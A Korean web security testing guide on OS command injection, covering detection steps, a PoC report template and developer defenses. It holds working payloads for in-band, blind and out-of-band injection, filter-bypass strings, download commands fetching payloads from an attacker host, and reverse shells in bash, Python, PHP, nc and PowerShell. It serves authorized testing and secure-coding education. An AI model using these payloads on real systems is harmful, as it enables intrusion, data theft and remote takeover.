---
sidebar_position: 12
title: 운영체제 명령어 삽입 (OS Command Injection)
description: 웹 진단 - OS Command Injection 점검 절차, In-band/Blind/OOB 페이로드, commix 활용, 보고서 양식
keywords: [Command Injection, OS Command, RCE, Blind, OOB, Out-of-Band, commix, Burp Collaborator, OWASP A05]
draft: false
---

# 운영체제 명령어 삽입 (OS Command Injection)

> 사용자 입력이 OS 명령어 실행 함수로 전달되어, 공격자가 **임의의 OS 명령을 실행**할 수 있는 취약점.
> 발현 즉시 **RCE(Remote Code Execution)** 로 직결되며, 사실상 단일 결함만으로도 시스템 전체가 침해 가능한 최상위 위험.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection / KISA 입력값 검증 |
| **CWE** | [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html) |
| **영향도** | 🔴 매우 높음 (즉시 RCE → 시스템 전반 침해) |
| **점검 난이도** | 하 (직접 출력형) / 최상 (Blind + WAF + 비대화형 환경) |
| **예상 점검 시간** | 파라미터당 20분 ~ 4시간 (Blind/OOB는 시간 소요 큼) |

---

## 점검 목적

사용자 입력이 **셸 명령어 문자열에 그대로 결합**되어 시스템 호출 함수(`system()`, `exec()`, `Runtime.exec()`, `subprocess.Popen(shell=True)` 등)로 흘러가는지 확인한다. 성공 시 **임의 OS 명령 실행**, 즉 RCE가 발생하며, 이는 곧 **시스템 내 모든 파일 접근, 내부망 피벗팅, 클라우드 메타데이터 탈취, 권한 상승**으로 이어질 수 있다.

---

## 유형 구분

| 유형 | 특징 | 판정 방법 |
| :--- | :--- | :--- |
| **In-band (직접 출력형)** | 명령 결과가 응답에 그대로 노출됨 | 응답 본문에서 `id`/`whoami` 출력 직접 확인 |
| **Blind (Time-based)** | 응답 내용은 동일, 명령 실행 흔적 없음 | `sleep N` / `ping -c N` 으로 응답 지연 측정 |
| **Out-of-Band (OOB)** | 응답에도, 시간에도 흔적이 없을 때 사용 | DNS/HTTP 콜백 (Burp Collaborator) 수신 확인 |

> 운영 환경 점검 시 우선순위는 **In-band → Time-based → OOB** 순으로 시도. OOB는 외부 통신이 차단된 망에서는 동작하지 않으므로, 망 구성을 먼저 확인할 것.

### OS별 명령어 연산자

| OS | 사용 가능한 연산자 | 비고 |
| :--- | :--- | :--- |
| **Linux/Unix** | `;`, `&&`, `\|\|`, `\|`, `&`, `` ` ` ``, `$()`, 줄바꿈(`%0a`) | 셸(`sh`, `bash`, `zsh`)에 따라 일부 차이 |
| **Windows (cmd)** | `&`, `&&`, `\|\|`, `\|` | `;` 미동작. PowerShell은 `;` 동작 |
| **Windows (PowerShell)** | `;`, `\|`, `&` (호출 연산자) | `Invoke-Expression` 호출 시 별도 위험 |

---

## 진단 절차

### Step 1. 진입점 식별

OS 명령 호출이 의심되는 **기능 단위**를 우선 후보로 잡는다 (단순 파라미터 fuzz보다 효율적):

- **네트워크 도구**: ping, traceroute, nslookup, whois 진단 폼
- **파일 변환 / 처리**: 이미지 리사이즈(ImageMagick), PDF 변환, Office → PDF, 동영상 트랜스코딩
- **압축 / 해제**: ZIP/TAR 업로드 후 자동 해제
- **백업 / 다운로드**: 로그 다운로드, DB 덤프, 백업 파일 생성
- **외부 URL fetch**: URL 입력 후 서버에서 받아오는 기능 (curl/wget 호출 가능성)
- **파일명 / 메타데이터**: 업로드된 파일명이 셸로 그대로 흘러가는 경우 (특히 ImageMagick `-write` 등)

### Step 2. 1차 탐지 — 메타문자 주입

기존 정상 입력값 뒤에 메타문자 + 짧은 명령을 붙여 응답 변화 확인:

```
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1`id`
127.0.0.1$(id)
127.0.0.1%0aid
```

응답에 `uid=...` 또는 시스템 정보가 노출되면 → **In-band 확정**.

### Step 3. Blind 판정 (시간 기반)

응답이 동일하거나 결과 출력이 없을 때, **응답 지연**으로 실행 여부 확인:

```
127.0.0.1; sleep 10
127.0.0.1 && sleep 10
127.0.0.1 & ping -c 10 127.0.0.1     # Linux
127.0.0.1 & ping -n 11 127.0.0.1     # Windows (-n 11 ≈ 10초)
```

페이로드의 N과 응답 지연이 **선형 비례**(N=5 → 5초, N=10 → 10초)하면 → **Blind 확정**.

> 캐싱·CDN·DB 락 등 네트워크/애플리케이션 자체 지연과 혼동하지 않도록 **3회 이상 반복 측정** + **N 값을 바꿔가며 비교**.

### Step 4. OOB 판정 (DNS/HTTP 콜백)

응답에도, 시간에도 흔적이 없을 때 (예: 비동기 큐로 처리되는 작업):

```
127.0.0.1; nslookup abc123.<COLLAB>.oastify.com
127.0.0.1; curl http://abc123.<COLLAB>.oastify.com
127.0.0.1; ping -c 1 `whoami`.<COLLAB>.oastify.com
```

Burp Collaborator(또는 interactsh) 에서 **DNS/HTTP 요청이 수신**되고, 명령 결과(예: `whoami` 값)가 호스트명에 포함되어 들어오면 → **OOB 확정 + 데이터 추출 가능**.

### Step 5. OS / Shell 식별

In-band가 잡히면 OS와 사용 가능한 인터프리터를 확인:

```
; uname -a                  # Linux
; cat /etc/os-release       # Linux 배포판
& systeminfo                # Windows
& ver                       # Windows
; which python python3 perl php node bash sh   # 사용 가능한 인터프리터
```

이 정보로 다음 단계의 페이로드(특히 리버스 쉘) 유형이 결정된다.

### Step 6. 영향 입증

단순 `id`/`whoami` 가 아니라 **실제 위협 입증**:

- 시스템 정보 + 권한 (`id`, `hostname`, `cat /etc/passwd | head`)
- 환경변수 / 설정 파일 (앱 환경변수, AWS 키 노출 여부)
- 클라우드 메타데이터 접근 가능 여부 (`curl http://169.254.169.254/...`)
- 사전 협의된 경우에 한해 **리버스 쉘** 시도

---

## 페이로드 / 테스트 케이스

### 케이스 1: In-band 기본 탐지

**언제 쓰는지**: 입력값 처리 결과가 응답에 그대로 출력되는 기능 (ping 결과 화면, 변환 로그 출력 등).

```
; id
&& id
| id
`id`
$(id)
%0aid
```

**판정**: 응답에 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 같은 출력이 보이면 취약.

> 일부 환경은 stdout만 응답에 노출하고 stderr는 버린다. 출력이 없으면 `2>&1`을 붙여 stderr까지 묶어 본다: `; id 2>&1`.

### 케이스 2: Time-based Blind

**언제 쓰는지**: 메타문자는 들어가는데 결과 출력이 없을 때, 또는 응답이 항상 동일할 때.

```
; sleep 10
&& sleep 10
| sleep 10
& ping -c 10 127.0.0.1                         # Linux
& ping -n 11 127.0.0.1                         # Windows
; perl -e "sleep(10)"                          # sleep 차단 시
; python3 -c "import time;time.sleep(10)"      # 동일
```

**판정**: 같은 요청을 sleep 0/5/10으로 바꿔가며 보냈을 때 응답 시간이 0초/5초/10초로 비례하면 취약.

### 케이스 3: Out-of-Band (OOB) 탐지

**언제 쓰는지**: Blind도 잡히지 않거나, 비동기 작업(업로드 후 백그라운드 처리 등)으로 응답에 결과가 없는 경우. **외부 인터넷 통신이 가능한 환경에서만** 동작.

```
; nslookup <RANDOM>.<COLLAB>.oastify.com
; curl http://<RANDOM>.<COLLAB>.oastify.com
; wget http://<RANDOM>.<COLLAB>.oastify.com

# 명령 결과를 호스트명에 실어 외부로 추출
; nslookup `whoami`.<COLLAB>.oastify.com
; curl http://`hostname`.<COLLAB>.oastify.com
; ping -c 1 $(whoami | base64).<COLLAB>.oastify.com
```

**판정**: Burp Collaborator(또는 interactsh) 에서 DNS/HTTP 요청이 수신되면 RCE 확정. 호스트명 prefix에 `whoami`/`hostname` 결과가 포함되어 들어오면 데이터 추출까지 가능함을 입증.

### 케이스 4: 공백 차단 우회

**언제 쓰는지**: 입력값에서 공백(` `)이 차단·변환되어 명령 인자가 실행되지 않을 때.

```
# ${IFS} (Internal Field Separator) — 공백 대체
;cat${IFS}/etc/passwd
;{cat,/etc/passwd}                  # Brace expansion (bash)
;cat</etc/passwd                    # 입력 리다이렉션
;cat$IFS$9/etc/passwd

# Tab(%09) / Newline(%0a) — URL 인코딩 후 전송
;cat%09/etc/passwd
;cat%0a/etc/passwd
```

**판정**: 동일 페이로드에서 단순 공백은 차단되는데 위 우회는 동작하면 → **공백 필터만 있고 메타문자 자체는 통과** = 취약.

### 케이스 5: 키워드 / 명령어 차단 우회

**언제 쓰는지**: `cat`, `whoami` 등 특정 키워드가 블랙리스트로 차단된 경우.

```
# 따옴표 분리 — 셸은 따옴표를 무시하고 키워드 매칭은 회피
;w""ho""ami
;c'a't /etc/passwd

# 백슬래시 분리
;wh\oami
;c\at /etc/passwd

# 변수 결합
;a=who;b=ami;$a$b
;CMD=whoami;$CMD

# 와일드카드로 경로 재구성
;/usr/bin/whoa*
;/???/??t /etc/passwd               # /bin/cat /etc/passwd

# Base64 디코드 후 실행
;echo d2hvYW1p|base64 -d|sh
;`echo d2hvYW1p|base64 -d`
```

**판정**: 원본 키워드가 차단되는데 위 우회 페이로드로 동일 동작이 확인되면 → **블랙리스트 방어만 적용** = 취약.

### 케이스 6: Windows 환경

**언제 쓰는지**: 대상이 Windows IIS / .NET 등으로 식별되었을 때 (Linux 페이로드는 동작하지 않음).

```
& whoami
&& whoami
| whoami
& dir C:\
& systeminfo
& type C:\Windows\win.ini
& certutil -urlcache -split -f http://<ATTACKER>/payload.exe payload.exe
```

PowerShell이 호출되는 환경:

```
; whoami
; Get-Process
; Invoke-WebRequest http://<ATTACKER>/payload.ps1 -OutFile p.ps1
```

**판정**: `nt authority\system`, `iis apppool\<...>` 등 Windows 사용자명이 응답에 출력되면 취약.

### 케이스 7: 영향 입증 — 리버스 쉘

> ⚠️ **실무 주의**: 운영 환경 리버스 쉘 시도는 **반드시 사전 서면 협의**. 가능하면 점검계 또는 격리망 내 수신 서버로만 연결. PoC는 보통 `id`/`hostname` + `/etc/passwd` 일부 캡처 정도로 마무리.

**Bash (Linux):**

```bash
; bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
; bash -c 'bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1'
```

**Python (Linux/Windows 모두):**

```bash
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PHP:**

```bash
; php -r '$sock=fsockopen("<ATTACKER>",<PORT>);exec("sh <&3 >&3 2>&3");'
```

**mkfifo + nc (nc -e 옵션 차단 시):**

```bash
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER> <PORT> >/tmp/f
```

**Windows PowerShell:**

```powershell
; powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

**판정**: 공격자 측 `nc -lvnp <PORT>` 리스너에 셸이 붙으면 RCE 입증 완료.

### 케이스 8: 자동화 — commix

**언제 쓰는지**: 수동으로 in-band/Blind 가능성을 확인한 뒤, 페이로드 변형 / OS 식별 / 데이터 추출까지 한번에 자동화하고 싶을 때.

```bash
# GET 파라미터
commix --url="https://<TARGET>/ping?host=127.0.0.1" --batch

# POST 파라미터
commix --url="https://<TARGET>/ping" --data="host=127.0.0.1" --batch

# 쿠키 + 인증 세션
commix --url="https://<TARGET>/admin/diag?host=127.0.0.1" \
  --cookie="SESSION=abcd1234" --batch

# Burp 요청 파일 그대로 사용
commix -r request.txt --batch

# 특정 기법만 시도 (classic / eval / file-based / time-based / tempfile-based)
commix --url="..." --technique=t --batch          # time-based만

# 셸 진입까지 자동화
commix --url="..." --os-shell
```

> ⚠️ **실무 주의**: commix는 페이로드를 다수 시도하므로 운영망에서는 **요청 수 / 부하**가 크게 발생. 사전 협의 + `--threads 1` + 시간대 협의(점검 윈도우) 권장. `--os-shell`, `--os-pwn` 같은 인터랙티브 옵션은 운영 환경에서 사용 금지.

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 메타문자(`;`, `|`, `&&`, 백틱, `$()`, `%0a`) 삽입 시 응답에 **명령 실행 결과**(예: `uid=...`, `nt authority\...`) 가 노출됨
- [ ] `sleep N` / `ping -c N` 페이로드에서 **응답 지연이 N과 비례**하여 발생 (3회 이상 재현)
- [ ] OOB 페이로드(`nslookup`/`curl <COLLAB>`) 에서 **DNS 또는 HTTP 콜백이 수신**됨
- [ ] commix가 인젝션을 확인하고 OS/사용자/셸 정보를 자동 추출 성공

**오탐 주의 (다음은 Command Injection 아님 또는 별도 결함):**

- [ ] 단순 500 오류만 발생하고 명령 실행 흔적 없음 (입력 검증으로 인한 어플리케이션 오류일 수 있음)
- [ ] 응답 지연이 페이로드 N과 무관하게 일정 (DB 쿼리/외부 API 지연일 가능성)
- [ ] 외부 통신 자체가 모든 입력에서 발생 (대상 기능이 정상적으로 외부 호출하는 경우 — SSRF로 분류 검토)
- [ ] OOB 콜백이 페이로드 없이도 수신됨 (앱이 정상적으로 외부 호출하는 정상 동작)

---

## PoC 양식 (보고서 붙여넣기용)

**[OS Command Injection - In-band] - 네트워크 진단 페이지 `host` 파라미터**

1. `<TARGET>/admin/diag/ping` 페이지에 관리자로 로그인 후 접근
2. `host` 파라미터 정상값(`127.0.0.1`) 으로 ping 결과 노출 확인
3. `host` 파라미터에 아래 페이로드를 삽입
4. 응답 본문에 `id` 명령 실행 결과 노출 확인

**요청 (Request):**

```http
POST /admin/diag/ping HTTP/1.1
Host: <TARGET>
Cookie: SESSION=abcd1234
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1%3B+id
```

**응답 (Response) — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<html>
  ...
  <pre>
  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms

  --- 127.0.0.1 ping statistics ---
  1 packets transmitted, 1 received, 0% packet loss, time 0ms
  rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  </pre>
  ...
</html>
```

**확인 사항:**
- 응답 본문에 `uid=33(www-data)` 가 출력되어, 입력값이 셸 명령으로 실행되었음이 확인됨
- 동일 패턴으로 `cat /etc/passwd`, `hostname`, `cat /proc/self/environ` 등 임의 명령 실행 가능
- 사전 협의 후 격리망 내 리스너로 리버스 쉘 연결 시도 시 셸 획득됨 (별첨 스크린샷)

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — 어플리케이션 권한으로 접근 가능한 모든 파일(설정, 인증서, DB 자격증명, AWS 키 등) 노출.
- **무결성 (Integrity)**: 🔴 **매우 높음** — 파일 생성/수정/삭제, 웹쉘 업로드, 어플리케이션 코드 변조 가능.
- **가용성 (Availability)**: 🔴 **높음** — 서비스 종료(`kill`, `shutdown`), 디스크 채우기, 핵심 파일 삭제로 즉시 장애 유발 가능.
- **추가 위협**:
  - **내부망 피벗팅** — 외부 노출이 안 된 내부 시스템으로 공격 확장
  - **클라우드 메타데이터 접근** — `169.254.169.254/latest/meta-data/iam/security-credentials/` 로 IAM 임시 자격증명 탈취
  - **권한 상승** — SUID 바이너리, sudo 설정, 커널 익스플로잇 등으로 root 획득
  - **지속성 확보** — cron, systemd, SSH 인증키 추가로 장기 침투

**비즈니스 임팩트:**
RCE 1건은 사실상 **시스템 전체 침해**와 동일하게 평가된다. 컨테이너/VM 격리가 약한 환경에서는 동일 호스트 내 다른 서비스까지 영향. 클라우드 환경에서는 IAM 자격증명 탈취로 계정 단위(전사 인프라) 영향이 발생할 수 있다. 실무 진단에서 **단일 Command Injection 1건도 Critical 등급**으로 분류.

---

## 대응방안

### 개발자 관점 (필수)

1. **시스템 명령 호출 자체를 회피** — 가장 안전한 대응은 셸 호출을 제거하는 것:
   - 파일 처리 → 언어 표준 라이브러리 (`Pillow`, `pdfplumber`, `zipfile` 등)
   - DNS 조회 → `socket.gethostbyname()`, `dnspython`
   - HTTP fetch → `requests`, `httpx` (curl/wget 호출 금지)

2. **불가피하게 외부 명령을 호출해야 한다면 — 셸을 거치지 말 것**:

   ```python
   # Python — 인자 배열 + shell=False
   subprocess.run(["ping", "-c", "4", host], shell=False, check=True)
   ```

   ```java
   // Java — ProcessBuilder + 인자 분리
   ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
   pb.start();
   ```

   ```javascript
   // Node.js — execFile (인자 배열). exec()는 절대 사용 금지
   const { execFile } = require('child_process');
   execFile('ping', ['-c', '4', host], (err, stdout) => { ... });
   ```

3. **입력값은 화이트리스트로 검증** — 셸로 흘러가기 전에 형식·문자 집합 제한:

   ```python
   import re, ipaddress

   def validate_host(host: str) -> str:
       # IP 또는 RFC 1123 호스트명만 허용
       try:
           ipaddress.ip_address(host)
           return host
       except ValueError:
           pass
       if re.fullmatch(r"[a-zA-Z0-9.\-]{1,253}", host):
           return host
       raise ValueError("invalid host")
   ```

4. **블랙리스트 방어는 무력화 가능** — 위 케이스 4·5처럼 우회 기법이 너무 다양하므로 단독 사용 금지.

### 운영자 관점

1. **최소 권한 실행** — 웹 어플리케이션 프로세스는 root 금지, 전용 계정(`www-data` 등)으로 실행. sudoers 비활성.

2. **시스템 콜 제한** — AppArmor / SELinux / seccomp 프로파일로 어플리케이션이 호출 가능한 syscall, 실행 가능한 바이너리를 화이트리스트화.

3. **컨테이너 격리** — read-only 루트 파일시스템, capability drop(`--cap-drop=ALL`), 네트워크 분리.

4. **클라우드 메타데이터 보호** — AWS IMDSv2 강제 (세션 토큰 필요), GCP/Azure도 동등 설정. EKS/ECS는 Pod/Task 단위 IAM 분리.

5. **WAF 룰 적용** — 셸 메타문자, 리버스 쉘 패턴 탐지 (보조 수단).

### 안전 / 위험 코드 비교

```python
# 위험 — 셸 문자열 결합 (가장 흔한 패턴)
import os
os.system(f"ping -c 4 {host}")
subprocess.Popen(f"ping -c 4 {host}", shell=True)

# 위험 — shell=True + 리스트 (여전히 셸이 해석)
subprocess.run(["sh", "-c", f"ping -c 4 {host}"])

# 안전 — 인자 배열 + shell=False (기본값)
subprocess.run(["ping", "-c", "4", host], shell=False, check=True)
```

```javascript
// 위험 — exec()는 셸을 거침
const { exec } = require('child_process');
exec(`ping -c 4 ${host}`);

// 안전 — execFile()은 셸 미경유
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', host]);
```

```java
// 위험 — Runtime.exec(String) 은 내부적으로 공백 분리 + 셸 메타문자 미처리
Runtime.getRuntime().exec("ping -c 4 " + host);

// 안전 — 배열 형태 전달
Runtime.getRuntime().exec(new String[]{"ping", "-c", "4", host});
```

---

## 참고자료

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PortSwigger - OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [commix 공식 문서](https://github.com/commixproject/commix/wiki)
- [Reverse Shell Cheat Sheet (PentestMonkey)](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
